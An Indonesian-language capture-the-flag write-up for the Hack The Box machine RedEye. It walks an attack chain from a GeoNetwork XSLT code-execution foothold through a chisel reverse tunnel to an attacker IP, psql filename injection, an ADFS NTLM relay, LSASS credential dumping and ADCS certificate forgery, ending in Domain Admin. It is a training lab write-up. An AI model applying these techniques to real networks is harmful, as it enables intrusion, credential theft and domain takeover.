# RedEye (HTB) — Writeup

> **Klasifikasi:** TLP:AMBER — Dokumentasi
> **Target:** `10.129.61.2x` / `airways.htb`  
> **Versi:** 1.0 (final)  
> **Penulis:** [ewexexexe / fmi]  
> **Distribusi:** Portofolio

---

## Ringkasan Jalur

RedEye adalah rantai serangan yang menghubungkan **web tier → service account Linux → Active Directory → ADCS → Domain Admin**. Tidak ada satu bug ajaib; keberhasilan datang dari beberapa misconfiguration yang saling melengkapi.

Garis besar:

1. GeoNetwork formatter upload → RCE sebagai `geonetwork`.
2. Pivot SOCKS ke `192.168.100.0/24`.
3. AODB spool injection → RCE sebagai `gisops`.
4. Kredensial domain di file environment → akses AD/ADFS/Rocket.Chat.
5. ADFS WIA NTLM relay → sesi `Owen.F` → password sementara `Isabel.O`.
6. Isabel → local admin `WKSTN01` → SYSTEM → LSASS/LSA → `user.txt`.
7. ADCS ESC13 → TGT `GPO-Auditors` → `WriteGPLink` di `OU=IT`.
8. TameMyCerts policy directory writable → forge sertifikat Administrator → PKINIT → `root.txt`.

---

## 1. Recon

Mulai dari permukaan eksternal. Yang dicari bukan hanya port terbuka, tetapi **aplikasi dan hostname** yang dilayani.

```bash
nmap -Pn -p- --min-rate 3000 --max-retries 1 10.129.61.2x
nmap -Pn -sC -sV -p22,80,443,3000 10.129.61.2x
```

Gunakan Host header untuk membedakan aplikasi di nginx:

```bash
curl -sS -D - -o /dev/null -H 'Host: geo.airways.htb' \
  http://10.129.61.2x/geonetwork/
curl -sS -k -D - -o /dev/null https://chat.airways.htb:3000/
curl -sS -k https://sts.airways.htb/adfs/.well-known/openid-configuration | jq .
```

Yang perlu dicatat:

- **GeoNetwork 4.4.11** di `geo.airways.htb/geonetwork`.
- **Rocket.Chat 8.8.0** di `chat.airways.htb:3000`, memakai SAML/ADFS.
- **ADFS** di `sts.airways.htb`, punya metadata OIDC dan relying party Rocket.Chat.
- Katalog GeoNetwork dapat diakses tanpa login; API formatter menerima sesi dan XSRF token.

Setelah foothold, petakan internal: `GN01` (`192.168.100.2x`), `DC01` (`192.168.100.1x`), `WKSTN01` (`192.168.100.3x`). Port DC yang penting: 53, 88, 135, 139, 389, 443, 445, 464, 636, 3268, 3269, 3389, 5985, 8081.

---

## 2. Foothold GeoNetwork

GeoNetwork memiliki fitur **formatter** berbasis XSLT. Formatter diunggah sebagai ZIP berisi `view.xsl`, lalu dirender saat sebuah record dipanggil. Prosesor Saxon mengizinkan Java extension function, sehingga formatter dapat memanggil `java.lang.Runtime` dan mengeksekusi command.

Arah eksploitasi:

- Endpoint upload ada di `/srv/api/formatters`.
- Butuh sesi GeoNetwork dan XSRF token; ambil token dari cookie setelah membuka `catalog.search`.
- Upload harus mengirim `Accept: application/json` agar dianggap sukses.
- Payload XSLT memakai namespace `java:java.lang.Runtime`, memanggil `getRuntime()` dan `exec()`.
- Trigger formatter pada sebuah record (`/srv/api/records/<uuid>/formatters/<name>`), lalu baca output command.

Yang perlu dibuktikan: command berjalan sebagai **`geonetwork`** di **`GN01`**. Ini adalah service account, bukan root — cukup untuk pivot dan membaca konfigurasi aplikasi.

---

## 3. Pivot dan gisops

Gunakan chisel reverse tunnel dari `GN01` ke host Anda, lalu ekspos SOCKS lokal:

- Server: `chisel server -p 8000 --reverse`.
- Client di `GN01`: `chisel client http://<ATTACKER_IP>:8000 R:1081:socks`.
- Arahkan `proxychains` ke `socks5 127.0.0.1 1081`.

Setelah tunnel aktif, host internal bisa dijangkau. Berikutnya, cari service yang berjalan sebagai akun lain di `GN01`. **AODB ingest** memproses file `.vrt` dari direktori spool dan menjalankan `psql`. Nama file VRT masuk ke command line `psql`; meta-command `\!` dapat mengeksekusi shell.

Arah eksploitasi:

- Pahami bagaimana `aodb-ingest.sh` memanggil `raster2pgsql`/`psql`.
- Cari cara menyisipkan newline dan `\!` lewat nama file VRT.
- Karena nama file tidak boleh mengandung `/`, gunakan trik `printf \057` atau encoding lain untuk membentuk path.
- Tulis script kecil ke direktori spool, lalu picu ingest agar script dieksekusi sebagai `gisops`.

Yang perlu dibuktikan: `id` sebagai **`gisops`**, lalu baca `/etc/airport-gis/notify.env`. File ini berisi kredensial domain `gabby.t` (di-mask di dokumen ini). Ini adalah titik di mana serangan berpindah dari Linux service ke Active Directory.

---

## 4. AD, ADFS, dan Rocket.Chat

Validasi kredensial `gabby.t` lewat SMB/LDAP. Group yang penting:

- **`GN_Admins`** — dipetakan ke role Administrator GeoNetwork via OIDC.
- **`PlatformEngineers`** — group IT/platform.
- **Domain Users** — akses standar.

Rocket.Chat memakai ADFS sebagai SAML IdP. Login SAML sebagai Gabby memberi akses ke channel publik, private group `platform-engineering`, dan DM dengan `Owen.F`. DM tersebut menyebut decommissioning report GeoNetwork/AODB.

Bagian yang menantang adalah mendapatkan sesi **Owen.F**. ADFS WIA (`/adfs/ls/wia`) menerima autentikasi NTLM. Jika Anda bisa membuat Owen melakukan autentikasi ke endpoint yang Anda kontrol, Anda dapat me-relay NTLM ke WIA, menyelesaikan alur SAML untuk relying party Rocket.Chat, dan menangkap `CREDENTIAL_TOKEN` milik Owen.

Arah eksploitasi:

- Siapkan HTTP server yang meminta NTLM (`401 WWW-Authenticate: NTLM`).
- Teruskan challenge/response ke `https://sts.airways.htb/adfs/ls/wia`.
- Setelah WIA menerima, lanjutkan ke halaman IdP-initiated sign-on dan pilih relying party Rocket.Chat.
- Post SAML response ke ACS Rocket.Chat; token muncul di redirect `/saml/<token>`.
- Gunakan token itu untuk login DDP sebagai Owen, lalu baca DM dengan Isabel.

Hasilnya adalah password sementara Isabel (di-mask). Ini bukan password final; Isabel akan diminta menggantinya saat login pertama.

---

## 5. Isabel dan WKSTN01

Isabel adalah anggota `Remote Desktop Users` di `DC01` dan **local administrator di `WKSTN01`**. Dari sini ada dua jalur:

1. **RDP ke DC01** sebagai Isabel untuk enumerasi lokal, akses `C:\PolicyFiles`, dan enrollment sertifikat.
2. **SMB/RPC ke WKSTN01** untuk mendapatkan SYSTEM lewat `smbexec`, lalu dump kredensial.

Di `WKSTN01`, `smbexec` membuat service sementara yang berjalan sebagai SYSTEM. Setelah itu:

- Buat direktori/share staging sementara untuk transfer tool dan output.
- Upload `procdump64.exe`, dump LSASS.
- Parse dengan `pypykatz`; jalankan `secretsdump` untuk SAM, LSA secrets, dan DCC2.
- Baca `user.txt` dari desktop user.

Yang perlu diperhatikan:

- LSA secret `DefaultPassword` dapat berisi kredensial domain (dalam lab ini, `Owen.F`).
- DCC2 untuk Administrator/Owen/Isabel bisa muncul, tetapi belum tentu berguna langsung.
- Tidak ada sesi Domain Admin di LSASS; jangan berharap dump langsung memberi DA.
- Semua share/file staging harus dihapus setelah selesai.

---

## 6. ADCS dan ESC13

Di `DC01`, jalankan enumerasi ADCS. `certipy find` akan menyorot template **`GroupPolicy_Audit`**:

- Client Authentication aktif.
- Wajib **ECDSA P-256** (min/max 256).
- Enrollment rights: **`GP Management`** (Isabel).
- Issuance policy ditautkan ke group **`GPO-Auditors`**.
- `GPO-Auditors` memiliki **`WriteGPLink`** di `OU=IT`.

Ini adalah **ESC13**: sertifikat yang diterbitkan membawa issuance policy, dan KDC menambahkan SID group yang ditautkan ke PAC. Artinya, sertifikat Isabel bisa memberi PAC dengan SID `GPO-Auditors`.

Arah eksploitasi:

- Buat request ECDSA P-256 untuk template `GroupPolicy_Audit` (gunakan `certreq` di Windows atau tool lain yang mendukung ECC).
- Submit ke CA `AIRWAYS-DC01-CA`, lalu export PFX.
- Gunakan PKINIT untuk mendapatkan TGT Isabel; PAC-nya berisi `GPO-Auditors`.
- Buktikan `WriteGPLink` dengan menambahkan `gPLink` ke GPO yang ada di `OU=IT`, membaca hasilnya, lalu menghapusnya kembali.

Yang perlu dibuktikan: TGT dengan `GPO-Auditors` dan add/delete `gPLink` berhasil. Ini adalah privilege valid, tetapi belum otomatis menjadi Domain Admin — Anda masih butuh GPO yang bisa dikendalikan atau jalur lain.

---

## 7. TameMyCerts — Final Boss

Di `DC01`, `C:\PolicyFiles` adalah direktori policy TameMyCerts. ACL-nya memberi `BUILTIN\Users` izin **CreateFiles/AppendData**. TameMyCerts memuat XML per-template dari direktori ini dan memercayainya.

Ini membuka jalur untuk memalsukan identitas sertifikat. Namun ada kontrol: CA menambahkan **SID certificate extension** (`1.3.6.1.4.1.311.25.2`) dari **requester** (Isabel, `...-1638`). Jika Anda hanya memaksa Subject/SAN menjadi Administrator, KDC akan menolak dengan `KDC_ERR_CERTIFICATE_MISMATCH` karena SID extension menunjuk ke Isabel.

Beberapa pendekatan yang tidak berhasil:

- **`SecurityIdentifierExtension>Remove`** — hanya menghapus extension yang ada di *request*, bukan SID yang ditambahkan CA saat issuance.
- **`SecurityIdentifierExtension>Add` + DirectoryServicesMapping** — untuk template online, TameMyCerts memetakan ke **requester** (Isabel), bukan SAN target.
- **ESC1/ESC15 standar** — dinormalisasi oleh TameMyCerts.

Insight yang membuka jalan: TameMyCerts mendukung **`CustomCertificateExtensions`**. Jika Anda menambahkan extension dengan OID yang sama (`1.3.6.1.4.1.311.25.2`) dan nilai SID Administrator (`...-500`), `SetCertificateExtension` akan **menimpa** SID extension yang dibuat default policy module. Hasilnya adalah sertifikat dengan Subject/SAN/SID yang konsisten menunjuk ke Administrator.

Arah eksploitasi:

1. Buat policy XML untuk template `User` yang:
   - memaksa Subject `CN=Administrator` dan email Administrator;
   - memaksa SAN UPN/email Administrator dan URI SID `...-500`;
   - menambahkan `CustomCertificateExtensions` dengan OID SID dan nilai SID Administrator.
2. Upload policy ke `C:\PolicyFiles\User.xml` (file baru; jangan menimpa policy asli).
3. Enroll template `User` sebagai Isabel, accept cert, export PFX.
4. Jalankan PKINIT dengan cert tersebut.
5. Verifikasi bahwa `certipy auth` menampilkan **SAN UPN**, **SAN URL SID**, dan **Security Extension SID** semuanya `...-500`, lalu mendapatkan TGT/hash Administrator.

Yang perlu dibuktikan: TGT `administrator@AIRWAYS.HTB` dan NT hash Administrator (di-mask). Ini adalah Domain Admin penuh.

---

## 8. Root

Dengan TGT Administrator, akses `C$` di `DC01` lewat SMB dan baca:

```text
C:\Users\Administrator\Desktop\root.txt
```

Gunakan `impacket-smbclient -k -no-pass` dengan `KRB5CCNAME` yang benar, lalu `get root.txt`. Flag root di-mask di dokumen ini.

---

## 9. Jika Stuck

Beberapa titik yang paling sering menghambat:

- **Formatter upload gagal:** cek sesi, XSRF token, dan header `Accept: application/json`.
- **VRT injection tidak jalan:** pahami dulu bagaimana filename masuk ke `psql`; cek permission spool dan format `.cmd.sh`.
- **Relay ADFS tidak menghasilkan token:** pastikan WIA mengembalikan 200/302, lalu lanjutkan SAML ke relying party Rocket.Chat yang benar.
- **ESC13 cert tidak bisa PKINIT:** template memakai ECDSA P-256; tool RSA-only akan gagal. Patch tool atau gunakan `certreq`.
- **Forged cert ditolak:** lihat SID extension di cert. Jika masih `...-1638`, custom extension belum menimpa nilai CA.
- **`C:\PolicyFiles` tidak bisa ditulis:** cek ACL; Users hanya punya CreateFiles/AppendData, bukan Modify. Buat file baru, jangan menimpa file lama.

---

## Referensi

- Microsoft KB5014754 — strong certificate mapping.
- TameMyCerts: <https://docs.tamemycerts.com>
- Certipy: <https://github.com/ly4k/Certipy>
- SpecterOps — Certified Pre-Owned.
- MITRE ATT&CK: <https://attack.mitre.org>
